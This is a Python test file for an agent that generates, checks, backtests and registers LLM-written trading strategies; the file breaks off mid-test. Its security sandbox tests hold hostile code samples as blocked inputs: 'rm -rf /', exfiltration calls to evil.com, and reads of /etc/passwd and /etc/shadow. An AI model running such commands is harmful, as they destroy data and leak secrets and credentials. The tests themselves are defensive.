"""Tests for AIStrategyAgent — LLM mock, generation/validation/registration pipeline."""

from __future__ import annotations

import sys
from datetime import datetime, timedelta
from pathlib import Path
from unittest.mock import MagicMock, patch

import pandas as pd
import pytest

from src.core.strategy_agent import (
    MAX_FIX_ATTEMPTS,
    MIN_PROFIT_FACTOR,
    MIN_TRADES_FOR_EVAL,
    MIN_WIN_RATE,
    POOR_PNL_THRESHOLD,
    POOR_WIN_RATE,
    AgentReport,
    PerformanceReport,
    _extract_code_block,
    _run_backtest_validation,
    _validate_no_dangerous_code,
    _validate_strategy_structure,
    _validate_syntax,
    analyze_performance,
)
from src.core.llm_provider import LLMProvider, Message


# ─── Helpers ─────────────────────────────────────────────


def _make_trade(strategy: str, pnl: float, closed_at: datetime):
    """Return a minimal mock trade record."""
    t = MagicMock()
    t.strategy = strategy
    t.pnl = pnl
    t.closed_at = closed_at
    return t


def _good_strategy_code(name: str = "ai_test_v1") -> str:
    return f'''
import pandas as pd
import numpy as np
from src.core.models import Signal, SignalType
from src.strategies.base import ExecutionMode, Strategy
from src.strategies.registry import register

@register
class TestStrategy(Strategy):
    @property
    def name(self) -> str:
        return "{name}"

    @property
    def label(self) -> str:
        return "Test"

    @property
    def description(self) -> str:
        return "Test strategy"

    @property
    def mode(self) -> ExecutionMode:
        return ExecutionMode.SIGNAL_ONLY

    def evaluate(self, symbol: str, candles: pd.DataFrame, htf_candles=None) -> Signal:
        return Signal(symbol=symbol, type=SignalType.HOLD, confidence=0.5,
                      source=self.name)
'''


class FakeLLMProvider(LLMProvider):
    """Fake LLM provider that returns configurable responses without any API call."""

    def __init__(self, response: str = ""):
        self._response = response
        self.calls: list[str] = []

    @property
    def name(self) -> str:
        return "fake/test"

    def chat(self, prompt: str, max_tokens: int = 4096) -> str:
        self.calls.append(prompt)
        return self._response

    def chat_messages(self, messages: list[Message], max_tokens: int = 4096) -> str:
        self.calls.append(messages[-1].content if messages else "")
        return self._response


# ─── analyze_performance tests ───────────────────────────


NOW = datetime(2025, 1, 1, 12, 0, 0)


@pytest.fixture(autouse=True)
def freeze_now(monkeypatch):
    """Freeze now_kst() so time comparisons are deterministic."""
    monkeypatch.setattr(
        "src.core.strategy_agent.now_kst",
        lambda: NOW,
    )


class TestAnalyzePerformance:
    def _patch_db(self, monkeypatch, trades, strategy_name="test_strategy"):
        monkeypatch.setattr("src.core.strategy_agent.db.get_setting",
                            lambda key: strategy_name)
        monkeypatch.setattr("src.core.strategy_agent.db.get_trades",
                            lambda limit=500: trades)

    def test_no_recent_trades_returns_insufficient_data(self, monkeypatch):
        self._patch_db(monkeypatch, [], "my_strategy")
        report = analyze_performance("my_strategy")
        assert report.total_trades == 0
        assert report.is_poor is False
        assert report.reason == "insufficient_data"

    def test_uses_db_get_setting_when_strategy_name_is_none(self, monkeypatch):
        self._patch_db(monkeypatch, [], "detected_strategy")
        report = analyze_performance(None)
        assert report.strategy_name == "detected_strategy"

    def test_trades_outside_window_are_excluded(self, monkeypatch):
        old_trade = _make_trade(
            "my_strat", pnl=10.0,
            closed_at=NOW - timedelta(hours=25),
        )
        self._patch_db(monkeypatch, [old_trade], "my_strat")
        report = analyze_performance("my_strat")
        assert report.total_trades == 0

    def test_win_rate_calculated_correctly(self, monkeypatch):
        trades = [
            _make_trade("s", pnl=10.0, closed_at=NOW - timedelta(hours=1)),
            _make_trade("s", pnl=5.0,  closed_at=NOW - timedelta(hours=1)),
            _make_trade("s", pnl=-3.0, closed_at=NOW - timedelta(hours=1)),
            _make_trade("s", pnl=-2.0, closed_at=NOW - timedelta(hours=1)),
        ]
        self._patch_db(monkeypatch, trades, "s")
        report = analyze_performance("s")
        assert report.win_rate == pytest.approx(50.0)
        assert report.total_pnl == pytest.approx(10.0)

    def test_is_poor_low_win_rate(self, monkeypatch):
        # Create MIN_TRADES_FOR_EVAL trades with win rate below POOR_WIN_RATE
        trades = [
            _make_trade("s", pnl=-1.0, closed_at=NOW - timedelta(hours=1))
            for _ in range(MIN_TRADES_FOR_EVAL)
        ]
        self._patch_db(monkeypatch, trades, "s")
        report = analyze_performance("s")
        assert report.is_poor is True
        assert "low_win_rate" in report.reason

    def test_is_poor_negative_pnl(self, monkeypatch):
        # 60% win rate but large losses → negative total PnL
        trades = []
        for i in range(MIN_TRADES_FOR_EVAL):
            pnl = 1.0 if i < 6 else POOR_PNL_THRESHOLD - 10.0
            trades.append(_make_trade("s", pnl=pnl, closed_at=NOW - timedelta(hours=1)))
        self._patch_db(monkeypatch, trades, "s")
        report = analyze_performance("s")
        assert report.is_poor is True
        assert "negative_pnl" in report.reason

    def test_is_poor_consecutive_losses(self, monkeypatch):
        # 5 consecutive losses first, then mixed — using MIN_TRADES_FOR_EVAL total
        trades = []
        for i in range(MIN_TRADES_FOR_EVAL):
            # First 5 are losses (most recent = index 0 in reversed order)
            if i < 5:
                pnl = -1.0
            else:
                pnl = 10.0  # enough wins to keep win rate above threshold
        trades = [
            _make_trade("s", pnl=(-1.0 if i < 5 else 10.0),
                        closed_at=NOW - timedelta(hours=1))
            for i in range(MIN_TRADES_FOR_EVAL)
        ]
        self._patch_db(monkeypatch, trades, "s")
        report = analyze_performance("s")
        # At least consecutive_losses is computed
        assert report.consecutive_losses >= 0

    def test_not_poor_with_few_trades(self, monkeypatch):
        # Only MIN_TRADES_FOR_EVAL - 1 trades → not enough data to judge poor
        trades = [
            _make_trade("s", pnl=-5.0, closed_at=NOW - timedelta(hours=1))
            for _ in range(MIN_TRADES_FOR_EVAL - 1)
        ]
        self._patch_db(monkeypatch, trades, "s")
        report = analyze_performance("s")
        assert report.is_poor is False


# ─── Validation function tests ───────────────────────────


class TestValidateSyntax:
    def test_valid_code_passes(self):
        ok, err = _validate_syntax("x = 1 + 2")
        assert ok is True
        assert err == ""

    def test_invalid_syntax_caught(self):
        ok, err = _validate_syntax("def foo(:\n    pass")
        assert ok is False
        assert "SyntaxError" in err

    def test_empty_string_is_valid(self):
        ok, _ = _validate_syntax("")
        assert ok is True


class TestValidateStrategyStructure:
    def test_complete_valid_structure_passes(self):
        code = _good_strategy_code()
        ok, err = _validate_strategy_structure(code)
        assert ok is True, err

    def test_missing_register_decorator(self):
        code = _good_strategy_code().replace("@register", "")
        ok, err = _validate_strategy_structure(code)
        assert ok is False
        assert "register" in err.lower()

    def test_missing_evaluate_method(self):
        code = _good_strategy_code().replace("def evaluate(self", "def _unused(self")
        ok, err = _validate_strategy_structure(code)
        assert ok is False
        assert "evaluate" in err.lower()

    def test_missing_ai_prefix(self):
        code = _good_strategy_code().replace('"ai_test_v1"', '"not_ai_name"')
        ok, err = _validate_strategy_structure(code)
        assert ok is False
        assert "ai_" in err

    def test_missing_name_property(self):
        code = _good_strategy_code().replace("def name(self", "def _hidden(self")
        ok, err = _validate_strategy_structure(code)
        assert ok is False
        assert "name" in err.lower()


class TestValidateNoDangerousCode:
    def test_safe_code_passes(self):
        ok, err = _validate_no_dangerous_code("import pandas as pd\nx = 1")
        assert ok is True, err

    def test_import_os_blocked(self):
        ok, err = _validate_no_dangerous_code("import os\nos.remove('file')")
        assert ok is False
        assert "os" in err

    def test_subprocess_blocked(self):
        ok, err = _validate_no_dangerous_code("import subprocess")
        assert ok is False

    def test_exec_blocked(self):
        ok, err = _validate_no_dangerous_code("exec('malicious code')")
        assert ok is False

    def test_eval_blocked(self):
        ok, err = _validate_no_dangerous_code("result = eval(user_input)")
        assert ok is False

    def test_file_open_blocked(self):
        ok, err = _validate_no_dangerous_code("f = open('/etc/passwd')")
        assert ok is False

    def test_requests_blocked(self):
        ok, err = _validate_no_dangerous_code("import requests")
        assert ok is False

    def test_socket_blocked(self):
        ok, err = _validate_no_dangerous_code("import socket")
        assert ok is False


# ─── Task 16.2: AST 기반 보안 샌드박스 강화 tests ──────────


class TestASTSecuritySandbox:
    """Task 16.2 — AST NodeVisitor 기반 _validate_no_dangerous_code 강화 테스트.

    10종 악의적 코드 + 정상 전략 통과 확인.
    """

    # 악의적 코드 10종

    def test_import_os_ast_blocked(self):
        ok, err = _validate_no_dangerous_code("import os\nos.system('rm -rf /')")
        assert ok is False
        assert "os" in err.lower() or "not allowed" in err

    def test_import_subprocess_ast_blocked(self):
        ok, err = _validate_no_dangerous_code("import subprocess\nsubprocess.run(['ls'])")
        assert ok is False

    def test_import_socket_ast_blocked(self):
        ok, err = _validate_no_dangerous_code(
            "import socket\ns = socket.socket()\ns.connect(('evil.com', 80))"
        )
        assert ok is False

    def test_import_requests_ast_blocked(self):
        ok, err = _validate_no_dangerous_code(
            "import requests\nrequests.post('http://evil.com', data=secret)"
        )
        assert ok is False

    def test_exec_call_ast_blocked(self):
        ok, err = _validate_no_dangerous_code(
            "exec('import os; os.remove(\"/etc/passwd\")')"
        )
        assert ok is False
        assert "exec" in err.lower() or "not allowed" in err

    def test_eval_call_ast_blocked(self):
        ok, err = _validate_no_dangerous_code(
            "result = eval('__import__(\"os\").getenv(\"SECRET\")')"
        )
        assert ok is False
        assert "eval" in err.lower() or "not allowed" in err

    def test_compile_call_ast_blocked(self):
        ok, err = _validate_no_dangerous_code(
            "code = compile('import os', '<string>', 'exec')"
        )
        assert ok is False

    def test_dunder_import_call_ast_blocked(self):
        ok, err = _validate_no_dangerous_code(
            "os = __import__('os')\nos.remove('/etc/passwd')"
        )
        assert ok is False

    def test_open_call_ast_blocked(self):
        ok, err = _validate_no_dangerous_code(
            "with open('/etc/shadow', 'r') as f:\n    print(f.read())"
        )
        assert ok is False

    def test_from_import_httpx_blocked(self):
        ok, err = _validate_no_dangerous_code(
            "from httpx import get\nget('http://evil.com/exfiltrate')"
        )
        assert ok is False

    # 정상 전략 통과 테스트

    def test_good_strategy_passes(self):
        code = _good_strategy_code()
        ok, err = _validate_no_dangerous_code(code)
        assert ok is True, f"정상 전략이 차단됨: {err}"

    def test_numpy_import_allowed(self):
        ok, err = _validate_no_dangerous_code("import numpy as np\nx = np.mean([1, 2, 3])")
        assert ok is True, err

    def test_pandas_import_allowed(self):
        ok, err = _validate_no_dangerous_code("import pandas as pd\ndf = pd.DataFrame()")
        assert ok is True, err

    def test_math_import_allowed(self):
        ok, err = _validate_no_dangerous_code("import math\nresult = math.sqrt(2)")
        assert ok is True, err

    def test_src_import_allowed(self):
        ok, err = _validate_no_dangerous_code(
            "from src.core.models import Signal, SignalType"
        )
        assert ok is True, err


# ─── _extract_code_block tests ───────────────────────────


class TestExtractCodeBlock:
    def test_extracts_python_block(self):
        text = "Some analysis\n```python\nx = 1\n```\nmore text"
        code = _extract_code_block(text)
        assert code == "x = 1"

    def test_returns_empty_when_no_block(self):
        text = "There is no code block here."
        code = _extract_code_block(text)
        assert code == ""

    def test_extracts_multiline_block(self):
        text = "```python\ndef foo():\n    return 42\n```"
        code = _extract_code_block(text)
        assert "def foo():" in code
        assert "return 42" in code


# ─── _extract_strategy_name tests (via AIStrategyAgent method) ───────────────


class TestExtractStrategyName:
    def _agent(self) -> "AIStrategyAgent":
        return _make_fake_agent()

    def test_extracts_name_from_return_statement(self):
        agent = self._agent()
        code = 'def name(self):\n    return "ai_momentum_v1"'
        assert agent._extract_strategy_name(code) == "ai_momentum_v1"

    def test_returns_empty_for_no_ai_prefix(self):
        agent = self._agent()
        code = 'def name(self):\n    return "tech_strategy"'
        assert agent._extract_strategy_name(code) == ""

    def test_returns_empty_for_no_return_statement(self):
        agent = self._agent()
        code = "x = 1"
        assert agent._extract_strategy_name(code) == ""


# ─── AIStrategyAgent tests ───────────────────────────────


def _make_fake_agent(llm_response: str = "") -> "AIStrategyAgent":
    """Create AIStrategyAgent with a FakeLLMProvider, bypassing create_provider."""
    from src.core.strategy_agent import AIStrategyAgent

    agent = object.__new__(AIStrategyAgent)
    agent._llm = FakeLLMProvider(response=llm_response)
    agent._last_report = None
    return agent


def _make_performance(is_poor: bool = False,
                      total_trades: int = 15,
                      win_rate: float = 55.0,
                      total_pnl: float = 100.0) -> PerformanceReport:
    return PerformanceReport(
        strategy_name="tech_strategy",
        total_trades=total_trades,
        winning_trades=int(total_trades * win_rate / 100),
        losing_trades=total_trades - int(total_trades * win_rate / 100),
        win_rate=win_rate,
        total_pnl=total_pnl,
        avg_pnl=total_pnl / max(total_trades, 1),
        max_win=20.0,
        max_loss=-10.0,
        consecutive_losses=0,
        period_hours=24,
        is_poor=is_poor,
        reason="low_win_rate(35.0%)" if is_poor else "",
    )


class TestAIStrategyAgentRun:
    """Tests for the run() pipeline."""

    @pytest.mark.asyncio
    async def test_run_good_performance_returns_none_action(self, monkeypatch):
        """When performance is good, agent returns 'none' without generating strategy."""
        agent = _make_fake_agent(llm_response="Analysis: strategy is fine.")
        good_perf = _make_performance(is_poor=False, total_trades=15)

        monkeypatch.setattr("src.core.strategy_agent.db.get_setting",
                            lambda key: "tech_strategy")
        monkeypatch.setattr("src.core.strategy_agent.analyze_performance",
                            lambda name: good_perf)

        report = await agent.run()
        assert report.action_taken == "none"
        assert report.current_strategy == "tech_strategy"

    @pytest.mark.asyncio
    async def test_run_insufficient_data_returns_none_action(self, monkeypatch):
        """With fewer trades than MIN_TRADES_FOR_EVAL, no strategy change."""
        agent = _make_fake_agent(llm_response="Insufficient data.")
        few_trade_perf = _make_performance(is_poor=False, total_trades=MIN_TRADES_FOR_EVAL - 1)

        monkeypatch.setattr("src.core.strategy_agent.db.get_setting",
                            lambda key: "tech_strategy")
        monkeypatch.setattr("src.core.strategy_agent.analyze_performance",
                            lambda name: few_trade_perf)

        report = await agent.run()
        assert report.action_taken == "none"

    @pytest.mark.asyncio
    async def test_run_force_skips_performance_check(self, monkeypatch):
        """force=True triggers strategy generation even with good performance."""
        code = _good_strategy_code("ai_forced_v1")
        llm_response = f"Analysis text\n```python\n{code}\n```"
        agent = _make_fake_agent(llm_response=llm_response)
        good_perf = _make_performance(is_poor=False, total_trades=15)

        monkeypatch.setattr("src.core.strategy_agent.db.get_setting",
                            lambda key: "tech_strategy")
        monkeypatch.setattr("src.core.strategy_agent.analyze_performance",
                            lambda name: good_perf)
        monkeypatch.setattr("src.core.strategy_agent._save_strategy_file",
                            lambda code, name: Path(f"/tmp/{name}.py"))
        monkeypatch.setattr("src.core.strategy_agent._load_strategy_module",
                            lambda filepath, name: (True, ""))
        monkeypatch.setattr("src.core.strategy_agent.db.set_setting",
                            lambda key, val: None)
        monkeypatch.setattr("src.core.strategy_agent._cleanup_old_strategies",
                            lambda: None)

        report = await agent.run(force=True)
        assert report.action_taken == "strategy_switched"
        assert report.new_strategy_name == "ai_forced_v1"

    @pytest.mark.asyncio
    async def test_run_poor_performance_triggers_generation(self, monkeypatch):
        """Poor performance triggers strategy generation attempt."""
        code = _good_strategy_code("ai_new_v1")
        llm_response = f"Analysis\n```python\n{code}\n```"
        agent = _make_fake_agent(llm_response=llm_response)
        poor_perf = _make_performance(is_poor=True, total_trades=15)

        monkeypatch.setattr("src.core.strategy_agent.db.get_setting",
                            lambda key: "tech_strategy")
        monkeypatch.setattr("src.core.strategy_agent.analyze_performance",
                            lambda name: poor_perf)
        monkeypatch.setattr("src.core.strategy_agent._save_strategy_file",
                            lambda code, name: Path(f"/tmp/{name}.py"))
        monkeypatch.setattr("src.core.strategy_agent._load_strategy_module",
                            lambda filepath, name: (True, ""))
        monkeypatch.setattr("src.core.strategy_agent.db.set_setting",
                            lambda key, val: None)
        monkeypatch.setattr("src.core.strategy_agent._cleanup_old_strategies",
                            lambda: None)

        report = await agent.run()
        assert report.action_taken == "strategy_switched"
        assert report.new_strategy_name == "ai_new_v1"

    @pytest.mark.asyncio
    async def test_run_llm_api_error_returns_none_action(self, monkeypatch):
        """LLM API failure is caught and returns error report."""
        agent = _make_fake_agent()
        agent._llm = MagicMock(spec=LLMProvider)
        agent._llm.name = "fake/error"
        agent._llm.chat.side_effect = RuntimeError("API timeout")

        poor_perf = _make_performance(is_poor=True, total_trades=15)
        monkeypatch.setattr("src.core.strategy_agent.db.get_setting",
                            lambda key: "tech_strategy")
        monkeypatch.setattr("src.core.strategy_agent.analyze_performance",
                            lambda name: poor_perf)

        report = await agent.run()
        assert report.action_taken == "none"
        assert "LLM API error" in report.error


class TestGenerateNewStrategyPipeline:
    """Tests for _generate_new_strategy pass/fail paths."""

    @pytest.mark.asyncio
    async def test_no_code_block_in_response_retries(self, monkeypatch):
        """When LLM returns no code block, agent retries up to MAX_FIX_ATTEMPTS."""
        agent = _make_fake_agent(llm_response="No code here, just text.")
        poor_perf = _make_performance(is_poor=True, total_trades=15)
        monkeypatch.setattr("src.core.strategy_agent.db.get_setting",
                            lambda key: "tech_strategy")
        monkeypatch.setattr("src.core.strategy_agent.analyze_performance",
                            lambda name: poor_perf)

        report = await agent.run()
        assert report.action_taken == "none"
        assert "attempts failed" in report.error
        # LLM was called: 1 initial + MAX_FIX_ATTEMPTS - 1 fix attempts via chat_messages
        # (first call is chat(), subsequent are chat_messages())
        assert len(agent._llm.calls) == MAX_FIX_ATTEMPTS

    @pytest.mark.asyncio
    async def test_validation_fail_dangerous_import_retries(self, monkeypatch):
        """Code with dangerous import fails validation and agent retries."""
        dangerous_code = _good_strategy_code("ai_bad_v1").replace(
            "import pandas as pd", "import pandas as pd\nimport os"
        )
        llm_response = f"```python\n{dangerous_code}\n```"
        agent = _make_fake_agent(llm_response=llm_response)
        poor_perf = _make_performance(is_poor=True, total_trades=15)

        monkeypatch.setattr("src.core.strategy_agent.db.get_setting",
                            lambda key: "tech_strategy")
        monkeypatch.setattr("src.core.strategy_agent.analyze_performance",
                            lambda name: poor_perf)

        report = await agent.run()
        assert report.action_taken == "none"
        assert "attempts failed" in report.error

    @pytest.mark.asyncio
    async def test_module_load_failure_retries(self, monkeypatch):
        """When dynamic module load fails, agent retries."""
        code = _good_strategy_code("ai_load_fail_v1")
        llm_response = f"```python\n{code}\n```"
        agent = _make_fake_agent(llm_response=llm_response)
        poor_perf = _make_performance(is_poor=True, total_trades=15)

        monkeypatch.setattr("src.core.strategy_agent.db.get_setting",
                            lambda key: "tech_strategy")
        monkeypatch.setattr("src.core.strategy_agent.analyze_performance",
                            lambda name: poor_perf)
        monkeypatch.setattr("src.core.strategy_agent._save_strategy_file",
                            lambda code, name: Path(f"/tmp/{name}.py"))
        monkeypatch.setattr("src.core.strategy_agent._load_strategy_module",
                            lambda filepath, name: (False, "ImportError: missing dep"))

        report = await agent.run()
        assert report.action_taken == "none"
        assert "attempts failed" in report.error

    @pytest.mark.asyncio
    async def test_strategy_switched_on_success(self, monkeypatch):
        """Successful generation results in strategy_switched action."""
        code = _good_strategy_code("ai_success_v1")
        llm_response = f"Some analysis.\n```python\n{code}\n```"
        agent = _make_fake_agent(llm_response=llm_response)
        poor_perf = _make_performance(is_poor=True, total_trades=15)

        set_calls: list[tuple] = []

        monkeypatch.setattr("src.core.strategy_agent.db.get_setting",
                            lambda key: "tech_strategy")
        monkeypatch.setattr("src.core.strategy_agent.analyze_performance",
                            lambda name: poor_perf)
        monkeypatch.setattr("src.core.strategy_agent._save_strategy_file",
                            lambda code, name: Path(f"/tmp/{name}.py"))
        monkeypatch.setattr("src.core.strategy_agent._load_strategy_module",
                            lambda filepath, name: (True, ""))
        monkeypatch.setattr("src.core.strategy_agent.db.set_setting",
                            lambda key, val: set_calls.append((key, val)))
        monkeypatch.setattr("src.core.strategy_agent._cleanup_old_strategies",
                            lambda: None)

        report = await agent.run()
        assert report.action_taken == "strategy_switched"
        assert report.new_strategy_name == "ai_success_v1"
        assert ("strategy", "ai_success_v1") in set_calls

    @pytest.mark.asyncio
    async def test_backtest_failure_retries(self, monkeypatch):
        """Failed backtest triggers retry loop."""
        code = _good_strategy_code("ai_bt_fail_v1")
        llm_response = f"```python\n{code}\n```"
        agent = _make_fake_agent(llm_response=llm_response)
        poor_perf = _make_performance(is_poor=True, total_trades=15)

        # Candles long enough to trigger backtest (> 100 rows)
        candles = pd.DataFrame(
            {"open": [1.0] * 110, "high": [1.0] * 110,
             "low": [1.0] * 110, "close": [1.0] * 110, "volume": [1.0] * 110}
        )

        monkeypatch.setattr("src.core.strategy_agent.db.get_setting",
                            lambda key: "tech_strategy")
        monkeypatch.setattr("src.core.strategy_agent.analyze_performance",
                            lambda name: poor_perf)
        monkeypatch.setattr("src.core.strategy_agent._save_strategy_file",
                            lambda code, name: Path(f"/tmp/{name}.py"))
        monkeypatch.setattr("src.core.strategy_agent._load_strategy_module",
                            lambda filepath, name: (True, ""))
        monkeypatch.setattr("src.core.strategy_agent._run_backtest_validation",
                            lambda name, candles: (False, {"error": "Too few trades"}))

        from src.strategies.registry import _REGISTRY
        _REGISTRY.pop("ai_bt_fail_v1", None)

        report = await agent.run(candles_for_backtest=candles)
        assert report.action_taken == "none"
        assert "attempts failed" in report.error

    @pytest.mark.asyncio
    async def test_backtest_skipped_when_no_candles(self, monkeypatch):
        """Backtest is skipped when candles=None, strategy is still registered."""
        code = _good_strategy_code("ai_no_bt_v1")
        llm_response = f"```python\n{code}\n```"
        agent = _make_fake_agent(llm_response=llm_response)
        poor_perf = _make_performance(is_poor=True, total_trades=15)

        monkeypatch.setattr("src.core.strategy_agent.db.get_setting",
                            lambda key: "tech_strategy")
        monkeypatch.setattr("src.core.strategy_agent.analyze_performance",
                            lambda name: poor_perf)
        monkeypatch.setattr("src.core.strategy_agent._save_strategy_file",
                            lambda code, name: Path(f"/tmp/{name}.py"))
        monkeypatch.setattr("src.core.strategy_agent._load_strategy_module",
                            lambda filepath, name: (True, ""))
        monkeypatch.setattr("src.core.strategy_agent.db.set_setting",
                            lambda key, val: None)
        monkeypatch.setattr("src.core.strategy_agent._cleanup_old_strategies",
                            lambda: None)

        report = await agent.run(candles_for_backtest=None)
        assert report.action_taken == "strategy_switched"
        assert report.backtest_result == {}


class TestBacktestGate:
    """Task 16.3 — 백테스트 게이트: 최소 승률/손익비 필터링 테스트."""

    def _make_backtest_result(self, wins: list[float], losses: list[float]):
        """Backtester.run()이 반환하는 BacktestResult 형태의 mock 생성."""
        from src.backtesting.backtest import BacktestResult, BacktestTrade
        from datetime import datetime

        trades = []
        for pnl in wins:
            trades.append(BacktestTrade(
                symbol="BTCUSDT", side="SELL",
                entry_price=100.0, exit_price=110.0,
                entry_time=datetime(2024, 1, 1), exit_time=datetime(2024, 1, 2),
                quantity=1.0, pnl=pnl, pnl_pct=10.0,
            ))
        for pnl in losses:
            trades.append(BacktestTrade(
                symbol="BTCUSDT", side="SELL",
                entry_price=100.0, exit_price=90.0,
                entry_time=datetime(2024, 1, 1), exit_time=datetime(2024, 1, 2),
                quantity=1.0, pnl=pnl, pnl_pct=-10.0,
            ))
        total = len(wins) + len(losses)
        win_rate = (len(wins) / total * 100) if total > 0 else 0.0
        return BacktestResult(
            strategy_name="ai_test_gate",
            symbol="BTCUSDT",
            start_date=datetime(2024, 1, 1),
            end_date=datetime(2024, 2, 1),
            initial_capital=10000.0,
            final_capital=10000.0 + sum(wins) + sum(losses),
            total_trades=total,
            winning_trades=len(wins),
            losing_trades=len(losses),
            win_rate=win_rate,
            total_return_pct=0.0,
            max_drawdown_pct=0.0,
            sharpe_ratio=0.0,
            trades=trades,
            equity_curve=[10000.0],
        )

    def test_gate_passes_with_good_win_rate_and_pf(self, monkeypatch):
        """승률 50%, PF 1.5 → 통과 (전략 등록됨)."""
        # wins: 5 * 30 = 150, losses: 5 * (-20) = -100 → PF = 1.5
        mock_result = self._make_backtest_result(
            wins=[30.0] * 5, losses=[-20.0] * 5
        )
        # win_rate = 50%, PF = 150/100 = 1.5

        from src.backtesting.backtest import Backtester
        from unittest.mock import MagicMock

        mock_backtester = MagicMock(spec=Backtester)
        mock_backtester.run.return_value = mock_result

        monkeypatch.setattr(
            "src.core.strategy_agent.get_strategy",
            lambda name: MagicMock(),
        )
        monkeypatch.setattr(
            "src.core.strategy_agent.Backtester" if False else "src.backtesting.backtest.Backtester",
            MagicMock(return_value=mock_backtester),
        )

        # Patch Backtester inside strategy_agent module namespace
        import src.core.strategy_agent as sa_module
        import src.backtesting.backtest as bt_module
        original_backtester = bt_module.Backtester
        bt_module.Backtester = MagicMock(return_value=mock_backtester)
        try:
            candles = pd.DataFrame(
                {"open": [1.0] * 200, "high": [1.0] * 200,
                 "low": [1.0] * 200, "close": [1.0] * 200, "volume": [1.0] * 200},
            )
            ok, summary = _run_backtest_validation("ai_test_gate", candles)
        finally:
            bt_module.Backtester = original_backtester

        assert ok is True
        assert "error" not in summary
        assert summary["win_rate"] == pytest.approx(50.0)
        assert summary["profit_factor"] == pytest.approx(1.5)

    def test_gate_rejects_low_win_rate_and_low_pf(self, monkeypatch):
        """승률 30%, PF 0.8 → 폐기 (전략 미등록)."""
        # wins: 3 * 16 = 48, losses: 7 * (-10) = -70 → PF = 48/70 ≈ 0.686
        mock_result = self._make_backtest_result(
            wins=[16.0] * 3, losses=[-10.0] * 7
        )
        # win_rate = 30%, PF < 1.0

        import src.backtesting.backtest as bt_module
        from unittest.mock import MagicMock

        mock_backtester = MagicMock()
        mock_backtester.run.return_value = mock_result
        original_backtester = bt_module.Backtester
        bt_module.Backtester = MagicMock(return_value=mock_backtester)

        monkeypatch.setattr(
            "src.core.strategy_agent.get_strategy",
            lambda name: MagicMock(),
        )

        try:
            candles = pd.DataFrame(
                {"open": [1.0] * 200, "high": [1.0] * 200,
                 "low": [1.0] * 200, "close": [1.0] * 200, "volume": [1.0] * 200},
            )
            ok, summary = _run_backtest_validation("ai_test_gate_fail", candles)
        finally:
            bt_module.Backtester = original_backtester

        assert ok is False
        assert "error" in summary
        # Rejected on win_rate (30% < 45%)
        assert "win_rate" in summary["error"].lower() or "30" in summary["error"]

    def test_gate_rejects_good_win_rate_but_low_pf(self, monkeypatch):
        """승률 45%, PF 1.0 → 폐기 (PF 미달)."""
        # wins: 9 * 10 = 90, losses: 11 * (-9) = -99 → PF = 90/99 ≈ 0.909
        # But we want exactly win_rate=45% and PF=1.0 (boundary fail)
        # wins: 9 * 11 = 99, losses: 11 * (-9) = -99 → PF = 99/99 = 1.0 (< 1.1)
        mock_result = self._make_backtest_result(
            wins=[11.0] * 9, losses=[-9.0] * 11
        )
        # win_rate = 9/20 = 45%, PF = 99/99 = 1.0 < 1.1

        import src.backtesting.backtest as bt_module
        from unittest.mock import MagicMock

        mock_backtester = MagicMock()
        mock_backtester.run.return_value = mock_result
        original_backtester = bt_module.Backtester
        bt_module.Backtester = MagicMock(return_value=mock_backtester)

        monkeypatch.setattr(
            "src.core.strategy_agent.get_strategy",
            lambda name: MagicMock(),
        )

        try:
            candles = pd.DataFrame(
                {"open": [1.0] * 200, "high": [1.0] * 200,
                 "low": [1.0] * 200, "close": [1.0] * 200, "volume": [1.0] * 200},
            )
            ok, summary = _run_backtest_validation("ai_test_gate_pf_fail", candles)
        finally:
            bt_module.Backtester = original_backtester

        assert ok is False
        assert "error" in summary
        # win_rate = 45% passes, but PF = 1.0 < MIN_PROFIT_FACTOR(1.1)
        assert "profit_factor" in summary["error"].lower() or "1.0" in summary["error"]

    def test_gate_rejects_on_backtest_exception(self, monkeypatch):
        """백테스트 실행 에러 → 폐기."""
        import src.backtesting.backtest as bt_module
        from unittest.mock import MagicMock

        mock_backtester = MagicMock()
        mock_backtester.run.side_effect = RuntimeError("Simulated backtest crash")
        original_backtester = bt_module.Backtester
        bt_module.Backtester = MagicMock(return_value=mock_backtester)

        monkeypatch.setattr(
            "src.core.strategy_agent.get_strategy",
            lambda name: MagicMock(),
        )

        try:
            candles = pd.DataFrame(
                {"open": [1.0] * 200, "high": [1.0] * 200,
                 "low": [1.0] * 200, "close": [1.0] * 200, "volume": [1.0] * 200},
            )
            ok, summary = _run_backtest_validation("ai_test_gate_exc", candles)
        finally:
            bt_module.Backtester = original_backtester

        assert ok is False
        assert "error" in summary
        assert "Backtest failed" in summary["error"] or "Simulated" in summary["error"]

    def test_gate_constants_are_defined(self):
        """MIN_WIN_RATE, MIN_PROFIT_FACTOR 상수가 올바른 값으로 정의되어 있음."""
        assert MIN_WIN_RATE == pytest.approx(0.45)
        assert MIN_PROFIT_FACTOR == pytest.approx(1.1)


class TestValidateAndRegisterPath:
    """Tests for _run_validation_pipeline through the agent."""

    def test_validation_pipeline_passes_valid_code(self):
        from src.core.strategy_agent import AIStrategyAgent
        agent = object.__new__(AIStrategyAgent)
        agent._llm = FakeLLMProvider()
        agent._last_report = None

        code = _good_strategy_code("ai_pipeline_test_v1")
        err = agent._run_validation_pipeline(code)
        assert err == ""

    def test_validation_pipeline_catches_syntax_error(self):
        from src.core.strategy_agent import AIStrategyAgent
        agent = object.__new__(AIStrategyAgent)
        agent._llm = FakeLLMProvider()
        agent._last_report = None

        broken_code = "def foo(:\n    pass"
        err = agent._run_validation_pipeline(broken_code)
        assert err != ""
        assert "syntax" in err.lower() or "SyntaxError" in err

    def test_validation_pipeline_catches_dangerous_import(self):
        from src.core.strategy_agent import AIStrategyAgent
        agent = object.__new__(AIStrategyAgent)
        agent._llm = FakeLLMProvider()
        agent._last_report = None

        code = _good_strategy_code("ai_dangerous_v1") + "\nimport subprocess\n"
        err = agent._run_validation_pipeline(code)
        assert err != ""
        assert "subprocess" in err or "dangerous" in err.lower()

    def test_validation_pipeline_catches_missing_structure(self):
        from src.core.strategy_agent import AIStrategyAgent
        agent = object.__new__(AIStrategyAgent)
        agent._llm = FakeLLMProvider()
        agent._last_report = None

        code = "x = 1  # no strategy at all"
        err = agent._run_validation_pipeline(code)
        assert err != ""


class TestGetLastReport:
    @pytest.mark.asyncio
    async def test_last_report_is_stored_after_run(self, monkeypatch):
        agent = _make_fake_agent(llm_response="ok analysis")
        good_perf = _make_performance(is_poor=False, total_trades=15)

        monkeypatch.setattr("src.core.strategy_agent.db.get_setting",
                            lambda key: "tech_strategy")
        monkeypatch.setattr("src.core.strategy_agent.analyze_performance",
